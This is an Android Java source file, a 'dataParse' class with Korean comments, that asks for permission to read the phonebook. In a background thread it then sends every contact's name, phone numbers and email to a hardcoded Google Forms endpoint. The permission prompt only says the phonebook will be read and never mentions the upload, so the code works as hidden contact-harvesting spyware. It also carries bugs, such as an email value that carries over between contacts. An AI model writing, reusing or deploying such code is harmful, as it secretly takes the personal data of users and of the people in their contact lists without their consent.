package com.humanplus.dataparse;

import android.Manifest;
import android.app.Activity;
import android.app.AlertDialog;
import android.content.Context;
import android.content.DialogInterface;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.os.Build;
import android.provider.ContactsContract;
import android.support.v4.app.ActivityCompat;
import android.support.v4.content.ContextCompat;
import android.util.Log;
import android.widget.Toast;

import java.net.URLEncoder;

import static android.widget.Toast.LENGTH_SHORT;


/**
 * Created by HumanPlus on 2016-12-19.
 */

public class dataParse {
    private String name, digit, email = null;

    // MainActivity for first parameter
    // CurrentActivity for second parameter
    public dataParse(Activity MainActivity, final Activity CurrentActivity) {
        final Activity Mainactivity = MainActivity;
        final Activity Currentactivity = CurrentActivity;
        // Checks user's android device version
        // 6.0 이상만 이 코드가 필요함
        if(Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            int permissionCheck = ContextCompat.checkSelfPermission(MainActivity, Manifest.permission.READ_CONTACTS);

            if (permissionCheck == PackageManager.PERMISSION_DENIED) {
                ContextCompat.checkSelfPermission(MainActivity, Manifest.permission.READ_CONTACTS);
                // 만약에 else문에서 거절된 적이 있으면, 밑의 코드가 실행됨
                if (ActivityCompat.shouldShowRequestPermissionRationale(MainActivity, Manifest.permission.READ_CONTACTS)) {
                    AlertDialog.Builder dialog = new AlertDialog.Builder(CurrentActivity);
                    dialog.setTitle("권한 요청")
                            .setMessage("전화번호부를 읽습니다.")
                            .setPositiveButton("예", new DialogInterface.OnClickListener() {
                                @Override
                                public void onClick(DialogInterface dialog, int which) {
                                    ActivityCompat.requestPermissions(Currentactivity, new String[]{Manifest.permission.READ_CONTACTS}, 1000);
                                }
                            })
                            .setNegativeButton("아니오", new DialogInterface.OnClickListener() {
                                @Override
                                public void onClick(DialogInterface dialog, int which) {
                                    Toast.makeText(Currentactivity, "요청이 거절되었습니다.", LENGTH_SHORT).show();
                                }
                            }).create().show();
                } else {

                    // Request READ_CONTACT to android system
                    // 최초 실행시 권한 요청청
                    ActivityCompat.requestPermissions(MainActivity, new String[]{Manifest.permission.READ_CONTACTS}, 1000);
                }
            } else {
                // 권한이 있을 때
                // 전화번호부를 읽고 파싱하는 코드가 들어가야함

                // 파싱 되는 걸 모두 기다릴 수 없기 때문에 쓰레드로 처리함
                Thread thread = new Thread(new Runnable() {
                    @Override
                    public void run() {
                        postData(CurrentActivity);
                    }
                });

                thread.start();

                Toast.makeText(CurrentActivity, "성공", LENGTH_SHORT);
            }
        }
    }

    public void postData(Context context) {
        String data;
        HttpRequest mReq = new HttpRequest();
        String fullUrl = "https://docs.google.com/forms/d/e/1FAIpQLSc20W60NSiIaPtczC8qIScyZ4xHGyIqzszWOhPND_AccKu9UA/formResponse";

        String[] arrNameProjection = {
                ContactsContract.Contacts._ID,
                ContactsContract.Contacts.DISPLAY_NAME
        };
        String [] arrPhoneProjection = {
                ContactsContract.CommonDataKinds.Phone.NUMBER
        };
        String[] arrEmailProjection = {
                ContactsContract.CommonDataKinds.Email.DATA
        };


        // Get user list from contacts
        // Declare a cursor and point to next until NULL

        Cursor clsCursor = context.getContentResolver().query(
                ContactsContract.Contacts.CONTENT_URI, arrNameProjection,
                ContactsContract.Contacts.HAS_PHONE_NUMBER + "=1", null, null
        );

        while(clsCursor.moveToNext()) {
            String strContactId = clsCursor.getString(0);
            digit = "0";
            // name
            name = clsCursor.getString(1);
            Log.i("ACT: ", "name: " + name);

            // phone number
            Cursor clsPhoneCursor = context.getContentResolver().query(
                    ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                    arrPhoneProjection, ContactsContract.CommonDataKinds.Phone.CONTACT_ID + " = " + strContactId,
                    null, null
            );

            while(clsPhoneCursor.moveToNext()) {
                digit += clsPhoneCursor.getString(0);
                Log.i("ACT: ", "phone number: " + clsPhoneCursor.getString(0));
            }
            clsPhoneCursor.close();

            // email
            Cursor clsEmailCursor = context.getContentResolver().query(
                    ContactsContract.CommonDataKinds.Email.CONTENT_URI,
                    arrEmailProjection,
                    ContactsContract.CommonDataKinds.Phone.CONTACT_ID + " = " + strContactId
                    , null, null
            );

            while(clsEmailCursor.moveToNext()) {
                email = clsEmailCursor.getString(0);
                Log.i("ACT: ", "Email: " + clsEmailCursor.getString(0));
            }
            clsEmailCursor.close();

            // Parse
            // If 'email' does not exist in phonebook, will not parse 'email'
            if(email == null) {
                data = "entry.1521821869=" + URLEncoder.encode(name) + "&" +
                        "entry.1402370873=" + URLEncoder.encode(digit);
            } else {
                data = "entry.1521821869=" + URLEncoder.encode(name) + "&" +
                        "entry.1402370873=" + URLEncoder.encode(digit) + "&" +
                        "entry.11686854=" + URLEncoder.encode(email);
            }
            mReq.sendPost(fullUrl, data);
        }
    }
}
